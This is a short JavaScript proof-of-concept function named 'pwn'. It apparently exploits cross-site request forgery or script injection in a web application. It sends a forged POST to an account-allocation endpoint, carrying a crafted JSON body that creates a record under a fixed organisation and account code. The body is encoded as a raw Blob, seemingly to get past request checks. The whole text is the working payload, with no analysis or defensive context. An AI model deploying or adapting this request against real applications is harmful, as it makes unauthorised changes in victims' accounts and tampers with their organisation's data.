
function pwn(){
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("load").innerHTML = this.responseText;
    }
  };
  xhttp.open("POST", "/AccountAllocations/SaveAccountAllocation", true);
  xhttp.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
  var body = "{\"OrgId\":10530,\"RangeId\":\"undefined\",\"Name\":\"tester\",\"Description\":\"tester\",\"RangeDeleted\":false,\"RangeFromDate\":\"4/26/2018\",\"RangeToDate\":\"12/31/9999\",\"RangeDetails\":\"\",\"FilterMode\":0,\"ShiftTypeIds\":\"\",\"LocationIds\":\"\",\"Action\":\"1\",\"Splits\":[{\"Name\":\"Master\",\"IsMaster\":true,\"AARS_ID\":\"-1\",\"WageCodes\":[],\"Details\":[{\"AARSD_ID\":-1,\"ACCD_ID\":50334,\"Percent\":\"100\",\"IsDefault\":true}]}],\"AdHocCodes\":[],\"CustomACCD_ID\":-99999}"; 
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhttp.send(new Blob([aBody]));
}
